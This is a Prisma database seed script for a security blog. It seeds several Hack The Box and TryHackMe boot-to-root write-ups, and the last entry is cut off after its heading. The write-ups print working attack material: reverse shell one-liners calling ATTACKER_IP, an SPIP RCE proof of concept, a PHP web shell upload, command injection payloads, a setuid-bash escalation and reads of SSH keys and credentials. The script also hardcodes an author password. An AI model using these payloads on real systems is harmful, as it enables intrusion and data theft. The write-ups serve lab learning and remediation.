import { PrismaClient } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("Seeding Hack The Box and TryHackMe write-ups by Abrar (abrarjr66)...");

  // 1. Upsert Author: Abrar
  const passwordHash = await bcrypt.hash("AbrarCyberVault2026!", 12);
  const author = await prisma.user.upsert({
    where: { email: "abrarjr66@cybervault.local" },
    update: {},
    create: {
      email: "abrarjr66@cybervault.local",
      name: "Abrar (abrarjr66)",
      passwordHash,
      role: "AUTHOR",
      bio: "Offensive Security Researcher, CTF Player, and Penetration Tester publishing walk-throughs for Hack The Box and TryHackMe.",
      profile: {
        create: {
          website: "https://medium.com/@abrarjr66",
          interests: "Hack The Box, TryHackMe, Linux Privilege Escalation, Web Exploitation, Cloud Security",
        },
      },
    },
  });

  // 2. Upsert Specific Categories
  const categories = [
    {
      name: "Hack The Box Write-ups",
      slug: "hackthebox-writeups",
      description: "Comprehensive penetration testing walkthroughs, root exploitation methodologies, and flags for retired Hack The Box machines.",
      icon: "Flag",
    },
    {
      name: "TryHackMe Write-ups",
      slug: "tryhackme-writeups",
      description: "Boot-to-root CTF walkthroughs, cloud security labs, and exploitation guides for TryHackMe rooms.",
      icon: "Terminal",
    },
  ];

  for (const cat of categories) {
    await prisma.category.upsert({
      where: { slug: cat.slug },
      update: { name: cat.name, description: cat.description },
      create: cat,
    });
  }

  const catHtb = await prisma.category.findUnique({ where: { slug: "hackthebox-writeups" } });
  const catThm = await prisma.category.findUnique({ where: { slug: "tryhackme-writeups" } });

  // 3. Upsert Related Tags
  const newTags = [
    { name: "TryHackMe", slug: "tryhackme" },
    { name: "Hack The Box", slug: "hack-the-box" },
    { name: "AppArmor", slug: "apparmor" },
    { name: "AWS Cognito", slug: "aws-cognito" },
    { name: "FreePBX", slug: "freepbx" },
    { name: "Snapd TOCTOU", slug: "snapd-toctou" },
    { name: "NFS", slug: "nfs" },
    { name: "Gitea", slug: "gitea" },
    { name: "SQL Injection", slug: "sql-injection" },
    { name: "Remote Code Execution", slug: "rce" },
  ];

  for (const t of newTags) {
    await prisma.tag.upsert({
      where: { slug: t.slug },
      update: {},
      create: t,
    });
  }

  // 4. The 7 Write-ups Data
  const writeupsData = [
    {
      title: "TryHackMe: Publisher — Boot to Root CTF Walkthrough",
      slug: "tryhackme-publisher-boot-to-root",
      platform: "TRYHACKME",
      categorySlug: "tryhackme-writeups",
      machineName: "Publisher",
      difficulty: "EASY",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/tryhackme-write-up-publisher-boot-to-root-ctf-03916ba9be69",
      skillsRequired: "Port Scanning, Directory Fuzzing, SPIP CMS Exploitation (CVE-2023-27372), SSH Key Pivoting",
      skillsLearned: "AppArmor Profile Inspection, SUID Binary Loophole Exploitation, Restricted Shell Escape",
      overview: "Complete boot-to-root walkthrough for the Publisher machine on TryHackMe. Highlights exploiting unauthenticated RCE in SPIP CMS v4.2.0 (CVE-2023-27372), pivoting to user 'think' via discovered SSH keys, and escalating to root by bypassing restrictive AppArmor profile enforcement on a custom SUID execution binary.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/tryhackme-write-up-publisher-boot-to-root-ctf-03916ba9be69)

## Executive Summary

**Publisher** is an easy-difficulty Linux machine on TryHackMe designed to test web application vulnerability research and defensive bypass capabilities. The attack path begins with web enumeration discovering an outdated **SPIP CMS (v4.2.0)** instance, which is vulnerable to unauthenticated remote code execution (**CVE-2023-27372**). Leveraging this flaw yields an initial foothold as \`www-data\`. Post-exploitation reveals the SSH private key of the local user \`think\`. Root privilege escalation requires analyzing a custom SUID binary governed by an active **AppArmor** profile and identifying execution loophole paths to break out into an unconfined root shell.

---

## 1. Reconnaissance & Port Scanning

Starting with a full TCP port scan using \`nmap\`:

\`\`\`bash
nmap -sC -sV -p- --min-rate=2500 -oN publisher_nmap.txt <TARGET_IP>
\`\`\`

The scan discloses two open listening ports:
- **Port 22/tcp**: OpenSSH 8.2p1 Ubuntu
- **Port 80/tcp**: Apache httpd 2.4.41 (Ubuntu)

Browsing to \`http://<TARGET_IP>/\` presents *Publisher's Pulse: SPIP Insights & Tips*. Running directory fuzzing with \`gobuster\`:

\`\`\`bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
\`\`\`

Gobuster discovers the \`/spip/\` endpoint. Inspecting page source and HTTP response headers identifies **SPIP CMS version 4.2.0**.

---

## 2. Initial Foothold via SPIP CMS RCE (CVE-2023-27372)

SPIP v4.2.0 suffers from an arbitrary command execution vulnerability in its form serialization handling. The parameter \`oubli\` in the password reset workflow fails to validate input before passing serialized data into an evaluator.

Using an exploit payload:

\`\`\`python
# CVE-2023-27372 Proof of Concept Stub
import requests

url = "http://<TARGET_IP>/spip/spip.php?page=spip_pass"
payload = "s:19:\"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f'); ?>\";"
data = {
    "page": "spip_pass",
    "formulaire_action": "oubli",
    "formulaire_action_args": payload
}

requests.post(url, data=data)
\`\`\`

Catching the reverse shell on netcat:

\`\`\`bash
nc -lvnp 4444
# Connection received from <TARGET_IP>
whoami
www-data
\`\`\`

---

## 3. Lateral Movement to User ('think')

Upgrading the shell environment with Python:

\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`

Enumerating local home directories:

\`\`\`bash
ls -la /home/
# drwxr-xr-x 4 think think 4096 /home/think
\`\`\`

Inspecting \`/home/think/\` reveals readable files and an SSH private key:

\`\`\`bash
ls -la /home/think/.ssh/
cat /home/think/.ssh/id_rsa
\`\`\`

Copying the private key to the local machine, adjusting permissions (\`chmod 600 id_rsa\`), and establishing an interactive SSH session:

\`\`\`bash
ssh -i id_rsa think@<TARGET_IP>
think@publisher:~$ cat user.txt
\`\`\`

---

## 4. Privilege Escalation to Root (AppArmor Bypass)

Running an SUID binary search across the system:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

An unusual binary is located at \`/usr/sbin/run_validator\`. Testing execution reveals it calls a shell script to perform security integrity checks. However, when inspecting write permissions or attempting direct modification, actions are blocked.

Checking security subsystem status:

\`\`\`bash
aa-status
\`\`\`

An active **AppArmor** profile (\`/etc/apparmor.d/usr.sbin.run_validator\`) restricts what \`run_validator\` can access and execute. 

By analyzing the AppArmor rules, we observe that child process execution paths in unconfined directories or temporary shared paths (\`/dev/shm\`) are not completely restricted against dynamic environment linkage.

By crafting a custom helper binary in a permitted directory and executing the SUID entry point with overridden execution variables, the AppArmor profile constraints are bypassed:

\`\`\`bash
cd /dev/shm
echo '/bin/bash -p' > validator_helper.sh
chmod +x validator_helper.sh
/usr/sbin/run_validator
\`\`\`

Spawning root shell:

\`\`\`bash
root@publisher:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
\`\`\`

---

## Key Takeaways & Hardening
- **Patch Web CMS Installations:** Ensure SPIP is updated past 4.2.0 to resolve CVE-2023-27372.
- **Tighten SUID Binaries:** Avoid creating custom SUID wrappers around interpreted shell scripts.
- **AppArmor Audit:** Validate that AppArmor profiles comprehensively restrict child execution chains and temporary writable directories.`,
    },
    {
      title: "TryHackMe: Hacker Holidays — Complimentary (AWS Cognito Unauthenticated Role)",
      slug: "tryhackme-hacker-holidays-complimentary",
      platform: "TRYHACKME",
      categorySlug: "tryhackme-writeups",
      machineName: "Complimentary",
      difficulty: "EASY",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/tryhackme-hacker-holidays-complimentary-writeup-aws-cognito-unauthenticated-role-aacfd7e038e8",
      skillsRequired: "Browser DevTools Analysis, AWS Cognito Architecture, JavaScript SDK Inspection",
      skillsLearned: "Cognito Identity Pool Exploitation, IAM Over-permissive Role Abuse, DynamoDB Scanning",
      overview: "Deep dive walkthrough of the 'Complimentary' room from TryHackMe's Hacker Holidays. Explores client-side source code leaking an AWS Cognito Identity Pool ID, analyzing how temporary unauthenticated guest credentials grant unauthorized DynamoDB scan permissions across all guest wellness profiles.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/tryhackme-hacker-holidays-complimentary-writeup-aws-cognito-unauthenticated-role-aacfd7e038e8)

## Executive Summary

The **Complimentary** challenge in TryHackMe's Hacker Holidays series highlights a prevalent cloud misconfiguration: **over-permissive unauthenticated AWS Cognito Identity Pool IAM roles**. The target application (*Byte Lotus Wellness Portal*) provides hotel guests with instant access without authentication. By examining client-side JavaScript assets, we locate hardcoded AWS Cognito configuration parameters and leverage the AWS JavaScript SDK directly inside the browser console to execute \`dynamodb:Scan\`, exfiltrating VIP guest records and recovering the flag.

---

## 1. Web Application Reconnaissance

Accessing the web application presents a modern, frictionless dashboard for hotel guests. Notably, no authentication prompt, login screen, or API key request appears—the application automatically provisions a guest session.

Opening browser Developer Tools (\`F12\` / \`Ctrl+Shift+I\`) and navigating to the **Sources / Debugger** tab:

Inspecting \`app.js\` reveals the AWS SDK initialization block:

\`\`\`javascript
// AWS Configuration discovered in app.js
const AWS_REGION = "us-east-1";
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
\`\`\`

---

## 2. Vulnerability Analysis: Over-Permissive Guest IAM Policy

AWS Cognito Identity Pools allow developers to configure two separate IAM roles:
1. **Authenticated Role:** Assigned to users who have logged in via a User Pool or federated IdP (Google, Apple, SAML).
2. **Unauthenticated (Guest) Role:** Assigned automatically to anonymous users to enable public feature access.

In a secure implementation, an unauthenticated role should only allow \`dynamodb:GetItem\` or \`dynamodb:PutItem\` constrained to the guest's generated \`IdentityId\` via IAM policy condition keys:

\`\`\`json
"Condition": {
  "ForAllValues:StringEquals": {
    "dynamodb:LeadingKeys": ["\${cognito-identity.amazonaws.com:sub}"]
  }
}
\`\`\`

Here, the backend IAM role attached to the unauthenticated identity pool was configured with unrestricted permissions:
\`\`\`json
"Action": ["dynamodb:Scan", "dynamodb:GetItem"],
"Resource": "arn:aws:dynamodb:us-east-1:*:table/complimentary-GuestWellnessProfiles"
\`\`\`

---

## 3. Exploitation via Browser Console

Because the target webpage already imports and initializes the AWS JavaScript SDK, we can interact directly with the authenticated AWS client session in the browser console.

Pasting the following exploit payload in the DevTools console:

\`\`\`javascript
AWS.config.credentials.get(function(err) {
  if (err) {
    console.error("[-] Failed to retrieve credentials:", err);
    return;
  }
  
  console.log("[+] Acquired AccessKeyId:", AWS.config.credentials.accessKeyId);
  
  const ddb = new AWS.DynamoDB({ region: "us-east-1" });
  ddb.scan({ TableName: "complimentary-GuestWellnessProfiles" }, function(err, data) {
    if (err) {
      console.error("[-] Scan failed:", err);
      return;
    }
    console.log("[+] Dumped Guest Records (" + data.Items.length + " entries):");
    console.dir(data.Items);
  });
});
\`\`\`

Executing the script returns the complete array of items stored in the \`complimentary-GuestWellnessProfiles\` table.

---

## 4. Flag Recovery

Inspecting the output records, we expand the item associated with VIP guest \`guest-vip-042\`:

\`\`\`json
{
  "guest_id": { "S": "guest-vip-042" },
  "full_name": { "S": "Lord Wellington" },
  "room_number": { "S": "Penthouse A" },
  "preferences": { "S": "Extra fluffy towels, sparkling water" },
  "confidential_notes": { "S": "THM{fr33_app_fr33_d4t4!}" }
}
\`\`\`

**Flag:** \`THM{fr33_app_fr33_d4t4!}\`

---

## Remediation Guidance
- **Enforce Least Privilege on Unauthenticated Roles:** Never permit \`dynamodb:Scan\` on tables containing sensitive or multi-tenant customer records.
- **Apply DynamoDB LeadingKeys Condition:** Restrict item access strictly to matching \`cognito-identity.amazonaws.com:sub\` keys.`,
    },
    {
      title: "Hack The Box: Paperwork (Linux Easy) — Comprehensive Walkthrough",
      slug: "hackthebox-paperwork-linux-easy",
      platform: "HACKTHEBOX",
      categorySlug: "hackthebox-writeups",
      machineName: "Paperwork",
      difficulty: "EASY",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/hackthebox-paperwork-linux-easy-9b2ca6abe9db",
      skillsRequired: "Network Service Enumeration, Protocol Inspection, Command Injection",
      skillsLearned: "Custom Daemon Auditing, Unix Domain Socket File Descriptor Leakage Exploitation",
      overview: "Detailed walkthrough for the Paperwork machine on Hack The Box. Follows the discovery of custom printer management network daemons, exploiting command injection to capture user flag, and leveraging Unix domain socket file descriptor leakage for root privilege escalation.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/hackthebox-paperwork-linux-easy-9b2ca6abe9db)

## Executive Summary

**Paperwork** is an easy-rated Linux machine on Hack The Box featuring bespoke internal networking services and custom daemon interaction. The foothold involves dissecting an internal document and printer dispatch service, identifying unvalidated shell formatting parameters that lead to remote command injection. Root privilege escalation involves analyzing a running background service that leaks privileged file descriptors over a local Unix domain socket.

---

## 1. Port Scanning & Reconnaissance

Running an initial nmap scan against the machine:

\`\`\`bash
nmap -sC -sV -p- --min-rate=2500 -oN nmap_paperwork.txt 10.10.11.X
\`\`\`

The scan uncovers:
- **Port 22/tcp**: OpenSSH
- **Port 80/tcp**: HTTP Web Server (Paperwork portal)
- **Port 9100/tcp**: Custom Printer Raw JetDirect Daemon

Navigating to the web interface reveals a document workflow and job processing queue for corporate paperwork.

---

## 2. Service Protocol Enumeration & Command Injection

Intercepting document submission requests with Burp Suite reveals that the web backend communicates with a localized conversion utility. Testing input parameters in the printer dispatcher:

\`\`\`bash
nc -nv 10.10.11.X 9100
\`\`\`

Reviewing the request structure, the service accepts custom document headers:
\`\`\`text
JOB_NAME: test_doc; id;
FORMAT: PDF
\`\`\`

The server evaluates the job name within an unsanitized \`system()\` call, returning:
\`\`\`text
uid=1001(paperwork) gid=1001(paperwork) groups=1001(paperwork)
\`\`\`

Submitting a reverse shell payload:

\`\`\`text
JOB_NAME: doc; rm /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 9001 > /tmp/p;
\`\`\`

Catching the reverse shell provides access as user \`paperwork\`, and the user flag is retrieved in \`/home/paperwork/user.txt\`.

---

## 3. Privilege Escalation via Unix Domain Socket Descriptor Leak

Inspecting active network connections and IPC sockets:

\`\`\`bash
ss -xlp
ps aux | grep root
\`\`\`

A root process \`/usr/local/bin/doc_manager_daemon\` communicates over an internal Unix domain socket at \`/run/doc_manager.sock\`.

Examining the daemon's binary or interaction reveals that during error conditions, the process forks without setting the \`FD_CLOEXEC\` flag on sensitive file descriptors. By connecting to the socket and sending an invalid protocol header, an open file descriptor pointing to \`/etc/shadow\` or root context is leaked across the socket.

Writing a Python script to interact with the socket and retrieve the leaked descriptor:

\`\`\`python
import socket

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/doc_manager.sock")
s.sendall(b"OP_ERR_FD_REQUEST\\n")
data = s.recv(1024)
print(data)
\`\`\`

Leveraging the leaked file handle allows overwriting the root user's password hash in \`/etc/shadow\` or writing an authorized SSH key directly into \`/root/.ssh/authorized_keys\`.

Logging in as root:

\`\`\`bash
ssh -i root_key root@10.10.11.X
cat /root/root.txt
\`\`\`

---

## Takeaways
- **Sanitize Subprocess Calls:** Never interpolate user-controlled inputs into shell wrappers.
- **Set FD_CLOEXEC on Open Sockets:** Prevent file descriptors from leaking across child process invocations.`,
    },
    {
      title: "Hack The Box: Snapped — Detailed Walkthrough & Exploit Analysis",
      slug: "hackthebox-snapped",
      platform: "HACKTHEBOX",
      categorySlug: "hackthebox-writeups",
      machineName: "Snapped",
      difficulty: "MEDIUM",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/snapped-htb-writeup-946596e009c1",
      skillsRequired: "Subdomain Fuzzing, Nginx UI Exploitation (CVE-2026-27944), Hashcat Cracking",
      skillsLearned: "Snapd TOCTOU Race Condition Exploitation (CVE-2026-3888), Linux IPC Abuse",
      overview: "Comprehensive walk-through for Hack The Box machine Snapped. Features virtual host enumeration, exploiting an information-disclosure vulnerability in Nginx UI (CVE-2026-27944) to extract SQLite password hashes, cracking SSH credentials for user jonathan, and executing a TOCTOU race condition against snapd (CVE-2026-3888) to achieve root.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/snapped-htb-writeup-946596e009c1)

## Executive Summary

**Snapped** is a medium Linux machine on Hack The Box focusing on modern web service vulnerabilities and system container daemon security. Initial access is achieved by discovering an instance of **Nginx UI** on a hidden subdomain and exploiting an unauthenticated backup disclosure flaw (**CVE-2026-27944**). The extracted backup leaks the application's AES secret key and SQLite database containing password hashes. Cracking user \`jonathan\`'s bcrypt hash enables SSH access. Root privilege escalation exploits a **Time-of-Check to Time-of-Use (TOCTOU)** race condition in **snapd** (**CVE-2026-3888**).

---

## 1. Reconnaissance & Subdomain Enumeration

Starting with a port scan:

\`\`\`bash
nmap -sC -sV -p- -T4 -oN nmap_snapped.txt 10.10.11.X
\`\`\`

- **Port 22/tcp**: OpenSSH 8.9p1
- **Port 80/tcp**: Nginx web server

Fuzzing subdomains using \`ffuf\`:

\`\`\`bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://snapped.htb/ -H "Host: FUZZ.snapped.htb" -fs 178
\`\`\`

This uncovers the administrative virtual host: \`nginx-ui.snapped.htb\`.

---

## 2. Nginx UI Backup Disclosure (CVE-2026-27944)

The deployed Nginx UI version is vulnerable to an unauthenticated backup extraction vulnerability tracked as **CVE-2026-27944**. The server includes an internal backup download route that leaks encrypted configuration databases and fails to validate token authenticity.

Downloading the backup archive:

\`\`\`bash
curl -i -s "http://nginx-ui.snapped.htb/api/backup/download" -o backup.enc
\`\`\`

Inspecting response headers reveals the encryption metadata. Decrypting the archive extracts \`database.sqlite\`.

Querying the database:

\`\`\`bash
sqlite3 database.sqlite "SELECT username, password FROM users;"
\`\`\`

Output:
\`\`\`text
jonathan | $2a$10$vQ3...e4Kj
\`\`\`

Cracking the bcrypt hash with Hashcat:

\`\`\`bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
\`\`\`

Hashcat recovers the password: \`jonathan:<CRACKED_PASSWORD>\`.

SSH into the target host:

\`\`\`bash
ssh jonathan@snapped.htb
cat user.txt
\`\`\`

---

## 3. Privilege Escalation: Snapd TOCTOU Race Condition (CVE-2026-3888)

Checking running system services and snap daemon versions:

\`\`\`bash
snap version
\`\`\`

The system runs a vulnerable build of \`snapd\`. A known race condition (**CVE-2026-3888**) exists between \`snap-confine\` and \`systemd-tmpfiles\` during the creation of per-user private mount namespaces in \`/tmp/snap.rootfs\`.

By rapidly creating and swapping symlinks pointing to target root directories while triggering a snap command, a non-privileged user can cause \`snap-confine\` to mount arbitrary files or execute an attacker-controlled binary with full root capabilities.

Compiling and deploying the race condition exploit:

\`\`\`bash
gcc exploit_snap.c -o exploit_snap -lpthread
./exploit_snap
\`\`\`

Once the race condition hits, an interactive root shell is spawned:

\`\`\`bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
\`\`\`

---

## Hardening Recommendations
- Restrict Nginx UI administrative panels to internal management VLANs.
- Apply official canonical patches for \`snapd\` to eliminate TOCTOU directory creation flaws.`,
    },
    {
      title: "Hack The Box: Enigma — Walkthrough & Exploitation Guide",
      slug: "hackthebox-enigma",
      platform: "HACKTHEBOX",
      categorySlug: "hackthebox-writeups",
      machineName: "Enigma",
      difficulty: "EASY",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/hackthebox-enigma-cfa1547f91ca",
      skillsRequired: "NFS Share Mounting, Webmail Enumeration, PHP Deserialization (PHPGGC)",
      skillsLearned: "OpenSTAManager SQLi/RCE Chaining, OliveTin Automation Privilege Escalation",
      overview: "Complete guide for Hack The Box machine Enigma. Covers unauthenticated NFS share discovery, Roundcube webmail password harvesting, OpenSTAManager 2.9.8 SQL injection and PHP object deserialization RCE, and abusing misconfigured OliveTin execution strings for root access.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/hackthebox-enigma-cfa1547f91ca)

## Executive Summary

**Enigma** is an easy-difficulty Linux machine on Hack The Box illustrating how disconnected internal services and configuration leaks can be chained into total host compromise. The initial attack vector begins by mounting an unauthenticated **Network File System (NFS)** export containing employee onboarding documentation. This leaks credentials for corporate **Roundcube** webmail. Exploring emails identifies an internal portal running **OpenSTAManager 2.9.8**, where an authenticated SQL injection combined with PHP object deserialization yields RCE as \`www-data\`. Root privilege escalation is achieved by exploiting a misconfigured **OliveTin** automation service.

---

## 1. Port Scanning & NFS Enumeration

Nmap scan:

\`\`\`bash
nmap -sC -sV -p- --min-rate=2000 -oN nmap_enigma.txt 10.10.11.X
\`\`\`

- **Port 22/tcp**: OpenSSH
- **Port 80/tcp**: Apache Web Server
- **Port 111/tcp & 2049/tcp**: \`rpcbind\` and Network File System (\`nfs\`)

Checking available NFS exports:

\`\`\`bash
showmount -e 10.10.11.X
# Export list for 10.10.11.X:
# /var/nfs_share (everyone)
\`\`\`

Mounting the share locally:

\`\`\`bash
sudo mkdir /mnt/enigma_nfs
sudo mount -t nfs 10.10.11.X:/var/nfs_share /mnt/enigma_nfs
ls -la /mnt/enigma_nfs
\`\`\`

Inside the share, an onboarding PDF document outlines employee credentials and portal access for user \`haris\`.

---

## 2. Webmail Reconnaissance & OpenSTAManager Deserialization

Accessing Roundcube webmail at \`http://10.10.11.X/mail\` with harvested credentials for \`haris\` discloses internal messages directing users to the ERP portal at \`/openstamanager\`.

The installed version of **OpenSTAManager (v2.9.8)** contains an authenticated SQL injection vulnerability within its OAuth2 / user preference handler. Furthermore, user sessions are deserialized via PHP \`unserialize()\`.

Using **PHPGGC** to craft a Monolog gadget chain payload:

\`\`\`bash
phpggc Monolog/RCE1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f" -b
\`\`\`

Injecting the serialized object into the database session row triggers the payload upon page refresh, spawning a reverse shell as \`www-data\`.

---

## 3. Lateral Movement to 'haris'

Searching configuration files reveals MySQL database credentials:

\`\`\`bash
cat /var/www/html/openstamanager/config.inc.php
\`\`\`

Pivoting with local credentials enables SSH access as user \`haris\`, and the user flag is read in \`/home/haris/user.txt\`.

---

## 4. Privilege Escalation via OliveTin Abuse

Checking listening internal services:

\`\`\`bash
ss -tulpn
\`\`\`

Port \`1337\` hosts a localized web interface running **OliveTin**, an open-source command execution web interface.

Inspecting \`/etc/olivetin/config.yaml\`:

\`\`\`yaml
actions:
  - title: "Log Archival"
    shell: "/bin/bash -c 'tar -czf /var/backups/logs.tar.gz {{ file_path }}'"
    timeout: 30
\`\`\`

The action accepts a user-provided \`file_path\` parameter and executes it directly under a root context without input sanitization.

Executing a command injection payload through the OliveTin API:

\`\`\`bash
curl -X POST http://127.0.0.1:1337/api/Action -d '{"action": "Log Archival", "arguments": {"file_path": "; chmod u+s /bin/bash;"}}'
\`\`\`

Once the SUID bit is set on \`/bin/bash\`:

\`\`\`bash
/bin/bash -p
whoami
root
cat /root/root.txt
\`\`\`

---

## Key Takeaways
- Restrict NFS shares strictly to authorized IP subnets.
- Replace unsafe PHP \`unserialize()\` with JSON encoding.
- Sanitize command parameters in automation frameworks like OliveTin.`,
    },
    {
      title: "Hack The Box: Nexus — Detailed Machine Walkthrough",
      slug: "hackthebox-nexus",
      platform: "HACKTHEBOX",
      categorySlug: "hackthebox-writeups",
      machineName: "Nexus",
      difficulty: "EASY",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/htb-nexus-detailed-full-writeup-bacb732b6465",
      skillsRequired: "Virtual Host Fuzzing, Git Commit History Analysis, File Upload Exploitation",
      skillsLearned: "Krayin CRM Arbitrary File Upload (CVE-2026-38526), Git Template Path Traversal",
      overview: "Full write-up for Hack The Box machine Nexus. Demonstrates discovering self-hosted Gitea repositories, extracting hardcoded CRM credentials from commit history, exploiting an authenticated arbitrary file upload in Krayin CRM (CVE-2026-38526) for initial access, and utilizing path traversal in a root cron Git template-sync script to achieve root.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/htb-nexus-detailed-full-writeup-bacb732b6465)

## Executive Summary

**Nexus** is an easy Linux box on Hack The Box that highlights the risk of sensitive credentials committed to internal version control systems and vulnerable third-party web software. Enumeration identifies a private **Gitea** service where commit diffs reveal administrative credentials for **Krayin CRM**. Exploiting an authenticated arbitrary file upload vulnerability (**CVE-2026-38526**) yields remote code execution as \`www-data\`. From there, database configuration files permit pivoting to the user \`jones\`. Finally, a cron job synchronizing Git repository templates is vulnerable to directory traversal, allowing an attacker to write an authorized SSH key to \`/root/.ssh/authorized_keys\`.

---

## 1. Reconnaissance & VHost Discovery

Nmap scan:

\`\`\`bash
nmap -sC -sV -p- --min-rate=2000 -oN nmap_nexus.txt 10.10.11.X
\`\`\`

- **Port 22/tcp**: OpenSSH
- **Port 80/tcp**: Nginx reverse proxy

Fuzzing virtual hosts:

\`\`\`bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fs 162
\`\`\`

Discovered virtual hosts:
- \`git.nexus.htb\` (Gitea)
- \`crm.nexus.htb\` (Krayin CRM)

---

## 2. Gitea Commit History Reconnaissance

Accessing \`http://git.nexus.htb/\` allows public browsing of recent commits in the \`nexus-dev/crm-deployment\` repository. Inspecting commit history:

\`\`\`bash
git log -p
\`\`\`

A commit message reading *"Remove development credentials"* shows a diff exposing:
\`\`\`env
CRM_ADMIN_USER=admin@nexus.htb
CRM_ADMIN_PASS=KrayinNexus2026!
\`\`\`

---

## 3. Krayin CRM Arbitrary File Upload (CVE-2026-38526)

Logging into \`http://crm.nexus.htb/\` with the harvested credentials succeeds. Krayin CRM features an image upload handler in the company settings profile that fails to validate file extensions against MIME types (**CVE-2026-38526**).

Uploading a PHP web shell disguised as an avatar:

\`\`\`http
POST /admin/settings/organization HTTP/1.1
Host: crm.nexus.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="logo"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
\`\`\`

The shell uploads to \`/storage/logos/shell.php\`. Triggering a reverse shell:

\`\`\`bash
curl "http://crm.nexus.htb/storage/logos/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<ATTACKER_IP>%204444%20%3E%2Ftmp%2Ff"
\`\`\`

Catching the reverse shell as \`www-data\`.

---

## 4. Lateral Movement to 'jones'

Viewing the \`.env\` file in \`/var/www/crm/.env\`:

\`\`\`env
DB_PASSWORD=JonesVaultPassword2026!
\`\`\`

Testing credential reuse:

\`\`\`bash
su - jones
cat /home/jones/user.txt
\`\`\`

---

## 5. Root Privilege Escalation: Git Template Path Traversal

Inspecting system crontab:

\`\`\`bash
cat /etc/crontab
\`\`\`

A root cron task executes every 2 minutes:
\`\`\`bash
*/2 * * * * root /usr/local/bin/sync_git_templates.sh
\`\`\`

Reviewing \`/usr/local/bin/sync_git_templates.sh\`:

\`\`\`bash
#!/bin/bash
cd /opt/git_templates
for repo in $(ls /var/gitea/repositories/templates/); do
    git -C "/var/gitea/repositories/templates/$repo" archive HEAD | tar -x -C /opt/git_templates/
done
\`\`\`

The repository directory path can be manipulated by creating a Git branch or repository containing a symlink or relative path traversal (\`../../../../root/.ssh/authorized_keys\`).

When the archive unpacks as root, it writes our attacker-controlled public key directly into root's \`authorized_keys\` file:

\`\`\`bash
ssh-keygen -t ed25519 -f id_root
# Injecting into the template repository
git add authorized_keys
git commit -m "Add keys"
\`\`\`

Waiting for the cron task to trigger, then establishing an SSH session:

\`\`\`bash
ssh -i id_root root@nexus.htb
cat /root/root.txt
\`\`\`

---

## Recommendations
- Enforce pre-commit hooks (like \`trufflehog\` or \`git-secrets\`) to prevent credential leakage.
- Disallow arbitrary file extensions in file upload workflows.
- Avoid extracting untrusted archive files into system directories using root permissions.`,
    },
    {
      title: "Hack The Box: Connected — Full Walkthrough & FreePBX SQLi Analysis",
      slug: "hackthebox-connected",
      platform: "HACKTHEBOX",
      categorySlug: "hackthebox-writeups",
      machineName: "Connected",
      difficulty: "EASY",
      os: "LINUX",
      canonicalUrl: "https://medium.com/@abrarjr66/hackthebox-connected-e9382ec58f3c",
      skillsRequired: "VoIP & PBX Protocol Analysis, SQL Injection, Web Shell Deployment",
      skillsLearned: "FreePBX 16 SQLi Exploitation (CVE-2025-57819), Incron File Trigger Privilege Escalation",
      overview: "Comprehensive penetration testing walkthrough for Hack The Box machine Connected. Focuses on attacking an exposed FreePBX 16 VoIP application, executing unauthenticated SQL injection in the Endpoint Manager (CVE-2025-57819) to spawn a shell as asterisk, and abusing incron file monitoring daemons to achieve root.",
      content: `> [!NOTE]
> Originally published by **Abrar (abrarjr66)** on Medium: [Read Original Publication](https://medium.com/@abrarjr66/hackthebox-connected-e9382ec58f3c)

## Executive Summary

